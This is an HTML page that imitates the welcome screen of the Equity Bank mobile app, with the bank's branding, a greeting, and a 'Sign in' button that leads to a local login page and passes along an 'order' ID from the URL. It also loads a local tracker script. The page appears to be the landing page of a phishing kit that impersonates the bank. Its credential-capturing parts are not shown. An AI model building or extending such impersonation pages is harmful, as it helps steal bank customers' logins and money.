<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Equity Mobile</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:#8B1A1A;
    display:flex;flex-direction:column;position:relative;overflow:hidden;
  }

  .bg-diamonds{
    position:absolute;top:0;left:0;right:0;bottom:0;pointer-events:none;overflow:hidden;
  }
  .diamond{
    position:absolute;
    border:none;
    transform:rotate(45deg);
  }
  .diamond-1{
    width:380px;height:380px;
    top:-60px;left:-120px;
    background:rgba(255,255,255,0.06);
  }
  .diamond-2{
    width:320px;height:320px;
    top:180px;left:60px;
    background:rgba(255,255,255,0.05);
  }
  .diamond-3{
    width:420px;height:420px;
    top:100px;right:-180px;left:auto;
    background:rgba(255,255,255,0.04);
  }
  .diamond-4{
    width:280px;height:280px;
    bottom:120px;left:-80px;
    background:rgba(255,255,255,0.035);
  }
  .diamond-5{
    width:350px;height:350px;
    bottom:-50px;right:-100px;left:auto;
    background:rgba(255,255,255,0.045);
  }

  .topbar{
    display:flex;align-items:center;justify-content:space-between;
    padding:18px 20px;position:relative;z-index:2;
  }
  .lang-btn{
    display:flex;align-items:center;gap:6px;
    background:none;border:none;color:#fff;font-size:14px;font-weight:500;
    cursor:pointer;font-family:inherit;
  }
  .lang-btn svg{width:24px;height:24px;fill:none;stroke:#fff;stroke-width:1.6}
  .lang-arrow{font-size:9px;margin-left:2px;opacity:0.9}
  .chat-btn{
    width:38px;height:38px;display:flex;align-items:center;justify-content:center;
    background:none;border:none;cursor:pointer;
  }
  .chat-btn svg{width:28px;height:28px;fill:none;stroke:#fff;stroke-width:1.5}

  .main-content{
    flex:1;display:flex;flex-direction:column;align-items:center;
    justify-content:center;padding:0 32px;position:relative;z-index:2;
    margin-top:-30px;
  }

  .logo-wrap{margin-bottom:40px}
  .logo-wrap img{height:72px;filter:brightness(0) invert(1)}

  h1{
    color:#fff;font-size:34px;font-weight:600;text-align:center;
    line-height:1.2;margin-bottom:18px;letter-spacing:-0.3px;
  }
  .subtitle{
    color:rgba(255,255,255,0.65);font-size:15px;text-align:center;
    line-height:1.5;max-width:300px;
  }

  .buttons{
    width:100%;padding:0 20px 44px;position:relative;z-index:2;
    display:flex;flex-direction:column;gap:12px;margin-top:auto;
  }
  .btn-signin{
    display:block;width:100%;padding:16px;border:none;border-radius:8px;
    font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;
    background:#fff;color:#8B1A1A;text-align:center;text-decoration:none;
    transition:.2s;
  }
  .btn-signin:hover{background:#f5f5f5}
  .btn-signin:active{transform:scale(0.98)}

  .btn-register{
    display:block;width:100%;padding:16px;border:1px solid rgba(255,255,255,0.3);border-radius:8px;
    font-size:16px;font-weight:600;cursor:pointer;font-family:inherit;
    background:#fff;color:#8B1A1A;text-align:center;text-decoration:none;
    transition:.2s;
  }
  .btn-register:hover{background:#f5f5f5}
  .btn-register:active{transform:scale(0.98)}
</style>
</head>
<body>

  <div class="bg-diamonds">
    <div class="diamond diamond-1"></div>
    <div class="diamond diamond-2"></div>
    <div class="diamond diamond-3"></div>
    <div class="diamond diamond-4"></div>
    <div class="diamond diamond-5"></div>
  </div>

  <div class="topbar">
    <button class="lang-btn" type="button">
      <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10A15.3 15.3 0 0112 2z"/></svg>
      Eng <span class="lang-arrow">&#9660;</span>
    </button>
    <button class="chat-btn" type="button">
      <svg viewBox="0 0 28 28" fill="none">
        <rect x="3" y="3" width="16" height="13" rx="2.5" stroke="#fff" stroke-width="1.8" fill="none"/>
        <path d="M7 16v2.5L10.5 16" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
        <rect x="10" y="8" width="14" height="11" rx="2.5" stroke="#fff" stroke-width="1.8" fill="none"/>
        <path d="M20 19v2.5L16.5 19" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
      </svg>
    </button>
  </div>

  <div class="main-content">
    <div class="logo-wrap">
      <img src="images/equity-logo.jpg" alt="Equity">
    </div>
    <h1>Welcome to<br>Equity mobile</h1>
    <p class="subtitle">Good morning! Sign in or register to continue</p>
  </div>

  <div class="buttons">
    <a class="btn-signin" id="signinBtn" href="login.html">Sign in</a>
    <a class="btn-register" id="registerBtn" href="https://play.google.com/store/apps/details?id=ke.co.equitybank" target="_blank" rel="noopener">Register</a>
  </div>

<script>
  var params = new URLSearchParams(location.search);
  var orderId = params.get("order");
  if(orderId){
    document.getElementById("signinBtn").href = "login.html?order=" + orderId;
  }

  var hour = new Date().getHours();
  var greeting = hour < 12 ? "Good morning" : hour < 17 ? "Good afternoon" : "Good evening";
  document.querySelector(".subtitle").textContent = greeting + "! Sign in or register to continue";
</script>
<script src="tracker.js"></script>
</body>
</html>
